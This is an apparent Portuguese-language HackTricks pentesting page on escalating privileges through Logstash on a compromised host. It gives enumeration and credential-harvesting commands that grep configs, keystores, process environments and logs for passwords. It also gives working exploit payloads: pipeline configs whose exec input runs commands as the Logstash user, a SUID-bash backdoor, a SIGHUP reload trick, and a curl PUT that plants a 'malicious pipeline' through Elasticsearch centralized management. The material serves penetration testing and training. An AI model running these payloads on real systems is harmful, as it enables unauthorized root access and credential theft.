# Escalação de Privilégios do Logstash

{{#include ../../banners/hacktricks-training.md}}

## Logstash

O Logstash é usado para **coletar, transformar e encaminhar logs** por meio de um sistema conhecido como **pipelines**. Esses pipelines são compostos por etapas de **input**, **filter** e **output**. Um aspecto interessante surge quando o Logstash opera em uma máquina comprometida.

### Configuração do Pipeline

Os pipelines são configurados no arquivo **/etc/logstash/pipelines.yml**, que lista os locais das configurações dos pipelines:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Este arquivo revela onde estão localizados os arquivos **.conf**, que contêm configurações de pipeline. Ao empregar um **Elasticsearch output module**, é comum que os **pipelines** incluam credenciais do **Elasticsearch**, que geralmente possuem privilégios amplos devido à necessidade do Logstash de gravar dados no Elasticsearch. Wildcards nos caminhos de configuração permitem que o Logstash execute todos os pipelines correspondentes no diretório designado.

Se o Logstash for iniciado com `-f <directory>` em vez de `pipelines.yml`, **todos os arquivos dentro desse diretório são concatenados em ordem lexicográfica e analisados como uma única configuração**. Isso cria 2 implicações ofensivas:

- Um arquivo inserido, como `000-input.conf` ou `zzz-output.conf`, pode alterar a forma como o pipeline final é montado
- Um arquivo malformado pode impedir o carregamento de todo o pipeline; portanto, valide os payloads cuidadosamente antes de depender do auto-reload

### Enumeração rápida em um host comprometido

Em uma máquina onde o Logstash está instalado, inspecione rapidamente:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Verifique também se a API de monitoramento local está acessível. Por padrão, ela faz bind em **127.0.0.1:9600**, o que geralmente é suficiente após obter acesso ao host:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Isso geralmente fornece IDs de pipeline, detalhes de execução e confirmação de que seu pipeline modificado foi carregado.

As credenciais recuperadas do Logstash normalmente permitem acessar o **Elasticsearch**, portanto verifique [esta outra página sobre Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Escalação de Privilégios via Pipelines Graváveis

Para tentar realizar a escalação de privilégios, primeiro identifique o usuário sob o qual o serviço Logstash está sendo executado, normalmente o usuário **logstash**. Certifique-se de atender a **um** destes critérios:

- Possuir **acesso de escrita** a um arquivo de pipeline **.conf** **ou**
- O arquivo **/etc/logstash/pipelines.yml** usar um wildcard, e você poder escrever na pasta de destino

Além disso, **uma** destas condições deve ser atendida:

- Capacidade de reiniciar o serviço Logstash **ou**
- O arquivo **/etc/logstash/logstash.yml** ter **config.reload.automatic: true** definido

Dado um wildcard na configuração, criar um arquivo que corresponda a esse wildcard permite a execução de comandos. Por exemplo:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Aqui, **interval** determina a frequência de execução em segundos. No exemplo fornecido, o comando **whoami** é executado a cada 120 segundos, com sua saída direcionada para **/tmp/output.log**.

Com **config.reload.automatic: true** em **/etc/logstash/logstash.yml**, o Logstash detectará e aplicará automaticamente configurações de pipeline novas ou modificadas, sem exigir uma reinicialização. Se não houver um wildcard, ainda será possível fazer alterações nas configurações existentes, mas recomenda-se cautela para evitar interrupções.

### Payloads de Pipeline Mais Confiáveis

O plugin de entrada `exec` ainda funciona nas versões atuais e exige um `interval` ou um `schedule`. Ele executa fazendo **forking** da JVM do Logstash; portanto, se a memória estiver limitada, seu payload poderá falhar com `ENOMEM` em vez de ser executado silenciosamente.

Um payload de privilege-escalation mais prático geralmente é aquele que deixa um artefato durável:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Se você não tiver permissões para reiniciar, mas puder enviar sinais ao processo, o Logstash também oferece suporte ao reload acionado por **SIGHUP** em sistemas semelhantes ao Unix:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Esteja ciente de que nem todo plugin é compatível com reload. Por exemplo, a entrada **stdin** impede o reload automático, portanto não presuma que `config.reload.automatic` sempre detectará suas alterações.

### Stealing Secrets from Logstash

Antes de se concentrar apenas na execução de código, colete os dados aos quais o Logstash já tem acesso:

- Credenciais em texto claro geralmente estão hardcoded dentro de outputs `elasticsearch {}`, `http_poller`, entradas JDBC ou configurações relacionadas à cloud
- Configurações seguras podem estar em **`/etc/logstash/logstash.keystore`** ou em outro diretório `path.settings`
- A senha do keystore é frequentemente fornecida por meio de **`LOGSTASH_KEYSTORE_PASS`**, e instalações baseadas em pacotes normalmente a obtêm de **`/etc/sysconfig/logstash`**
- A expansão de variáveis de ambiente com `${VAR}` é resolvida na inicialização do Logstash, portanto vale a pena inspecionar o ambiente do serviço

Verificações úteis:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Também vale a pena verificar isso porque o **CVE-2023-46672** mostrou que o Logstash podia registrar informações sensíveis em logs sob circunstâncias específicas. Em um host de post-exploitation, logs antigos do Logstash e entradas do `journald` podem, portanto, divulgar credenciais mesmo que a configuração atual faça referência ao keystore em vez de armazenar secrets diretamente.

### Abuso do Centralized Pipeline Management

Em alguns ambientes, o host **não** depende de arquivos `.conf` locais. Se **`xpack.management.enabled: true`** estiver configurado, o Logstash poderá obter pipelines gerenciados centralmente do Elasticsearch/Kibana e, após a ativação desse modo, as configurações de pipeline locais deixarão de ser a fonte de verdade.

Isso significa um caminho de ataque diferente:

1. Recuperar credenciais do Elastic nas configurações locais do Logstash, no keystore ou nos logs
2. Verificar se a conta tem o privilégio de cluster **`manage_logstash_pipelines`**
3. Criar ou substituir um pipeline gerenciado centralmente para que o host do Logstash execute seu payload no próximo intervalo de polling

A API do Elasticsearch usada para esse recurso é:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Isso é especialmente útil quando os arquivos locais são somente leitura, mas o Logstash já está registrado para buscar pipelines remotamente.

## Referências

- [Elastic Docs: Recarregando o Arquivo de Configuração](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configurar o Gerenciamento Centralizado de Pipelines](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
